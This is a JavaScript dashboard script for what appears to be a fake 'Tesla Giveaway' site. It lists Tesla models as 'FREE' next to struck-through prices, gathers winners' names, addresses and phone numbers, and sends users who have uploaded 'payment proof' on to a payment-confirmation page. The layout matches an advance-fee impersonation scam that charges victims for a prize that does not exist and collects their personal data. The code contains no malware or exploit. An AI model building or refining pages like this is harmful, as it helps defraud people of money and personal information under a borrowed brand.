// ╔══════════════════════════════════════════════════════════╗
// ║     Tesla Giveaway — Winner Dashboard Logic              ║
// ╚══════════════════════════════════════════════════════════╝

// Use VEHICLE_DATA from vehicle-data.js as the single source of truth.
// Roadster intentionally removed — no vehicle page or Supabase images exist for it.
var cars = (typeof VEHICLE_DATA !== 'undefined')
  ? Object.values(VEHICLE_DATA)
  : [];

var selectedCar = null;

// ── INIT ─────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', async function() {
  // Persist session from email-verify redirect
  var urlSession = getParam('session');
  if (urlSession) {
    saveSession(urlSession);
    // Clean URL
    if (window.history && window.history.replaceState) {
      window.history.replaceState(null, '', 'dashboard.html');
    }
  }

  var session = getSession();
  if (!session) { 
    window.location.href = 'entry.html'; 
    return; 
  }

  try {
    var data = await apiCall('/session?token=' + encodeURIComponent(session));
    if (!data.valid) { 
      clearSession(); 
      window.location.href = 'entry.html'; 
      return; 
    }

    // Show verified banner (only when coming from email link)
    if (urlSession) {
      var banner = document.getElementById('verifiedBanner');
      if (banner) {
        banner.style.display = 'flex';
        var nameDisplay = document.getElementById('userNameDisplay');
        if (nameDisplay) {
          nameDisplay.textContent = data.user.firstName || data.user.email.split('@')[0];
        }
      }
      // Launch confetti!
      launchConfetti(50);
    }

    // DB-driven redirect: if user has uploaded payment proof, always redirect to payment-confirmation
    if (data.hasPaymentProof && data.order && data.order.orderId) {
      window.location.href = 'payment-confirmation.html?order=' + encodeURIComponent(data.order.orderId);
      return;
    }

    window._userData = data.user;

    // Pre-fill name in delivery form
    var nameInput = document.querySelector('[name="fullName"]');
    if (nameInput && data.user.firstName) {
      nameInput.value = (data.user.firstName + ' ' + (data.user.lastName || '')).trim();
    }
    var phoneInput = document.querySelector('[name="deliveryPhone"]');
    if (phoneInput && data.user.phone) phoneInput.value = data.user.phone;

  } catch (err) { 
    clearSession(); 
    window.location.href = 'entry.html'; 
    return; 
  }

  // Recover selectedCar from sessionStorage if not in localStorage
  if (!localStorage.getItem('tesla_selected_car')) {
    var backup = sessionStorage.getItem('tesla_selected_car');
    if (backup) {
      try {
        localStorage.setItem('tesla_selected_car', backup);
      } catch(_) {}
    }
  }

  renderCars();
});

// ── CAR GRID ──────────────────────────────────────────────────
function renderCars() {
  var grid = document.getElementById('carGrid');
  if (!grid) return;

  var list = (typeof VEHICLE_DATA !== 'undefined') ? Object.values(VEHICLE_DATA) : cars;

  grid.innerHTML = list.map(function(car) {
    var specs = Array.isArray(car.specs)
      ? car.specs
      : [car.range, car.accel, car.drivetrain, car.seats].filter(Boolean);

    return '<div class="dash-car-card" onclick="selectCar(\'' + car.id + '\')">' +
      '<div style="background:linear-gradient(135deg,#f9fafb,#eef0f3);padding:32px 24px;display:flex;align-items:center;justify-content:center;min-height:210px;overflow:hidden;">' +
        '<img src="' + car.img + '" alt="Tesla ' + car.name + '" loading="lazy" ' +
          'style="height:160px;max-width:100%;object-fit:contain;transition:transform .4s cubic-bezier(.4,0,.2,1);" ' +
          'onerror="this.outerHTML=\'<div style=\\\'font-size:64px;text-align:center;\\\'>' + (car.emoji || '🚗') + '</div>\'">' +
      '</div>' +
      '<div style="padding:20px 22px 22px;display:flex;flex-direction:column;gap:8px;flex:1;">' +
        '<span style="display:inline-block;background:rgba(227,25,55,.08);color:#e31937;font-size:11px;font-weight:700;padding:4px 12px;border-radius:999px;border:1px solid rgba(227,25,55,.15);letter-spacing:.04em;width:fit-content;">' + (car.badge || '') + '</span>' +
        '<div style="font-size:20px;font-weight:900;color:#111;letter-spacing:-.4px;">Tesla ' + car.name + '</div>' +
        '<div style="font-size:14px;font-weight:700;color:#e31937;">FREE &mdash; <span style="text-decoration:line-through;color:#aaa;font-size:12px;font-weight:500;">' + car.price + '</span></div>' +
        '<div class="dash-specs" style="display:flex;flex-wrap:wrap;gap:6px;margin-top:4px;">' +
          specs.slice(0,4).map(function(s) {
            return '<div style="background:#f4f5f7;border:1px solid rgba(0,0,0,.07);border-radius:8px;padding:5px 10px;font-size:11px;font-weight:600;color:#555;">' + s + '</div>';
          }).join('') +
        '</div>' +
        '<div style="margin-top:auto;padding-top:14px;display:flex;align-items:center;gap:5px;font-size:13px;font-weight:700;color:#e31937;">' +
          'View Details &amp; Select' +
          '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>' +
        '</div>' +
      '</div>' +
    '</div>';
  }).join('');
}

function selectCar(carId) {
  // Navigate to the vehicle detail page — user selects the car there
  window.location.href = 'vehicles/' + carId + '.html';
}

function confirmCar() {
  if (!selectedCar) {
    showToast('Please select a Tesla vehicle first.', 'warning');
    return;
  }
  
  // Update step bar
  setStep(3);
  document.getElementById('stepSelectCar').style.display = 'none';
  var deliveryStep = document.getElementById('stepDelivery');
  deliveryStep.style.display = 'block';
  deliveryStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
  
  // Update selected car summary
  document.getElementById('selectedCarTitle').textContent = 'Tesla ' + selectedCar.name;
  document.getElementById('selectedCarColor').textContent = selectedCar.color;
  document.getElementById('selectedCarEmoji').textContent = selectedCar.emoji;
}

function goBackToCars() {
  setStep(2);
  document.getElementById('stepDelivery').style.display = 'none';
  document.getElementById('stepSelectCar').style.display = 'block';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ── STEP INDICATOR ────────────────────────────────────────────
function setStep(n) {
  var stepIds = ['sc1','sc2','sc3','sc4'];
  var labelIds = ['sl1t','sl2t','sl3t','sl4t'];
  var lineIds = ['sl1','sl2','sl3'];
  
  for (var i = 0; i < stepIds.length; i++) {
    var stepNum = i + 1;
    var circle = document.getElementById(stepIds[i]);
    var label = document.getElementById(labelIds[i]);
    
    if (!circle) continue;
    
    if (stepNum < n) {
      circle.className = 's-circle done'; 
      circle.textContent = '✓';
      if (label) label.className = 's-label done';
    } else if (stepNum === n) {
      circle.className = 's-circle active'; 
      circle.textContent = String(stepNum);
      if (label) label.className = 's-label active';
    } else {
      circle.className = 's-circle'; 
      circle.textContent = String(stepNum);
      if (label) label.className = 's-label';
    }
  }
  
  for (var j = 0; j < lineIds.length; j++) {
    var line = document.getElementById(lineIds[j]);
    if (!line) continue;
    if (j + 2 < n) {
      line.className = 's-line done';
    } else {
      line.className = 's-line';
    }
  }
}

// ── DELIVERY FORM ─────────────────────────────────────────────
document.addEventListener('submit', async function(e) {
  if (e.target.id !== 'deliveryForm') return;
  e.preventDefault();
  var form = e.target;

  var deliveryDetails = {
    fullName:      (form.fullName && form.fullName.value || '').trim(),
    address:       (form.address && form.address.value || '').trim(),
    city:          (form.city && form.city.value || '').trim(),
    state:         (form.state && form.state.value || '').trim(),
    zipCode:       (form.zipCode && form.zipCode.value || '').trim(),
    country:       (form.country && form.country.value || '').trim(),
    phone:         (form.deliveryPhone && form.deliveryPhone.value || '').trim(),
    instructions:  (form.instructions && form.instructions.value || '').trim(),
  };

  if (!deliveryDetails.fullName || !deliveryDetails.address || !deliveryDetails.city ||
      !deliveryDetails.state || !deliveryDetails.zipCode || !deliveryDetails.country) {
    showToast('Please fill in all required fields.', 'error');
    return;
  }

  // Save to localStorage and proceed to delivery method page
  try {
    localStorage.setItem('tesla_selected_car', JSON.stringify(selectedCar));
    localStorage.setItem('tesla_delivery_details', JSON.stringify(deliveryDetails));
    localStorage.setItem('tesla_session_token', getSession());
  } catch(e) {
    showToast('Unable to save your progress. Please try again.', 'error');
    return;
  }

  window.location.href = 'delivery-method.html';
});

function logout() {
  clearSession();
  try {
    localStorage.removeItem('tesla_selected_car');
    localStorage.removeItem('tesla_delivery_details');
    localStorage.removeItem('tesla_delivery_method');
    localStorage.removeItem('tesla_last_order');
  } catch(e) {}
  window.location.href = 'index.html';
}
